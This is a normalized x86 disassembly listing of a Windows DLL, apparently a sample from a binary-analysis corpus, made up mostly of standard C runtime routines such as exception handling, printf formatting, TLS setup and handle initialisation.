push eax
push 0xfffffffe
push sub_10006228
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_100062de
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_100062f8
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_1000624a
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_10006208
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_1000624a
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_100062de
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_100063d8
push esi
call sub_10006454
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_1000644b
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jb r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_1000644b
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_1000644b
mov [ eax ] 0xd
pop esi
retn
call sub_1000644b
mov [ eax ] 0x8
pop esi
retn
sub_1000645d
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_10008000
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_10008234
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_10008000
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_100081f0
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_10007f28
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_10006575
push ebp
mov ebp esp
sub esp 0x24c
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ecx ecx
push edi
mov [ ebp - 0x10 ] ecx
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp + 0xc ] esi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x800
mov edx 0x200
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp + 0xc ] esi
jne r-xdata
jmp [ eax * 4 + jump_table_10006cf3 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov edx 0x200
mov edi 0x800
xor eax eax
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] eax
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
and [ ebp - 0x2c ] 0x0
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ ecx + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x3c ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x28 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_10006db1
test eax eax
pop ecx
mov [ ebp - 0x28 ] eax
jge r-xdata
mov eax [ ebp - 0x8 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_10006db1
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jge r-xdata
cmp [ esi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_10006d13
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_10006d13
mov bl [ esi ]
add esp 0xc
inc esi
mov [ ebp + 0xc ] esi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x28 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
and [ ebp - 0x3c ] 0x0
cmp [ esi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
cmp [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x24c ]
mov [ ebp - 0xc ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc esi
inc esi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] esi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_10006dbe
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_10006db1
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x4 ] edi
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp [ ebp - 0x8 ] edx
jle r-xdata
cmp bl 0x67
jne r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x40 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x8 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x4c ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x48 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x4c ]
push edi
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_10006db1
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x34 ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_10006db1
pop ecx
xor edx edx
call sub_10006db1
pop ecx
jmp r-xdata
call sub_10006db1
pop ecx
movzx eax ax
jmp r-xdata
call sub_10006db1
pop ecx
movsx eax ax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
test edx edx
jg r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x8 ] 0x8
sub eax 0x3
je r-xdata
cmp [ ebp - 0x8 ] 0xa3
jle r-xdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x34 ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x24 ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
and [ ebp - 0x1c ] 0x0
jl r-xdata
push [ ebp - 0x30 ]
call sub_1000440b
and [ ebp - 0x30 ] 0x0
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
mov esi 0x7fffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x15d
push eax
call sub_100047df
test eax eax
pop ecx
mov [ ebp - 0x30 ] eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
push edi
call [ rw-data ]
pop ecx
call sub_100083c0
pop ecx
jmp r-xdata
test [ ebp - 0x4 ] edi
je r-xdata
call sub_10006db1
pop ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x10 ] 0x1
call sub_10006dce
push eax
lea eax [ ebp - 0x24c ]
push eax
call sub_1000843b
add esp 0xc
mov [ ebp - 0x10 ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0x40 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x8 ] eax
jle r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov [ ebp - 0x20 ] eax
neg edx
or [ ebp - 0x3 ] 0x1
mov [ ebp - 0x1c ] edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_10006db1
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0xc ] ecx
je r-xdata
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x8 ] 0xa3
mov edi eax
mov [ ebp - 0xc ] edi
jmp r-xdata
push edi
or [ ebp - 0x3 ] 0x1
inc edi
mov [ ebp - 0xc ] edi
push edi
call [ rw-data ]
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0xc ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0x8 ] eax
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x34 ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
lea eax [ ebp - 0x4d ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2c ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x10
je r-xdata
mov esi [ ebp - 0x28 ]
sub esi [ ebp - 0x24 ]
sub esi [ ebp - 0x10 ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x4 ] edi
mov eax [ ebp - 0x10 ]
cdq
mov edi edx
mov esi eax
push edi
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_10008570
push edi
push esi
push [ ebp - 0x1c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x20 ]
call sub_10008500
cmp ebx 0x39
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
jle r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
push eax
call sub_10006d79
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_10006d48
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x34 ]
lea eax [ ebp - 0x4d ]
sub eax [ ebp - 0xc ]
inc [ ebp - 0xc ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0x30
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call sub_10006d79
add esp 0x10
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_10006d48
add esp 0x10
mov [ ebp - 0x16 ] 0x20
dec [ ebp - 0xc ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_10006d48
add esp 0x10
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_10006d79
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x44 ]
push eax
inc ebx
call sub_1000843b
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_10006d13
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_1000645d
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_10006d48
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_10006d13
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_10006d79
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_10006d13
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_10006df0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10006ef9
push edi
call sub_10006f9e
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_10006fb0
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_10006fa7
pop edi
retn
push rw-data
push rw-data
call sub_10006fb0
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_10006fca
push esi
call sub_10005b2d
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_100085e5
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_1000703c
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_1000704f
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_100085e5
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_10004776
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_1000703c
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_100070b6
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call sub_1000440b
pop ecx
push 0x0
push [ rw-data ]
call [ TlsSetValue@IAT ]
pop esi
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_1000440b
pop ecx
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push eax
call sub_1000440b
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1000440b
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1000440b
pop ecx
mov eax [ esi + 0x50 ]
cmp eax rw-data
je r-xdata
push eax
call sub_1000440b
pop ecx
push esi
call sub_1000440b
pop ecx
push eax
call sub_1000440b
pop ecx
sub_10007156
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_100047df
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_10004776
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_100047df
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_10007312
push ebx
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
mov edi eax
add eax 0x480
cmp edi eax
jae r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push [ esi ]
call sub_1000440b
and [ esi ] 0x0
pop ecx
lea ebx [ edi + 0xc ]
mov eax [ esi ]
add edi 0x24
add eax 0x480
add ebx 0x24
cmp edi eax
jb r-xdata
push ebx
call [ DeleteCriticalSection@IAT ]
cmp [ ebx - 0x4 ] 0x0
je r-xdata
sub_10007366
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_10008bf8
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_100047df
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_10004776
pop ecx
push esi
call sub_100083c0
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_1000440b
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_100047df
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_100083c0
mov ebp eax
pop ecx
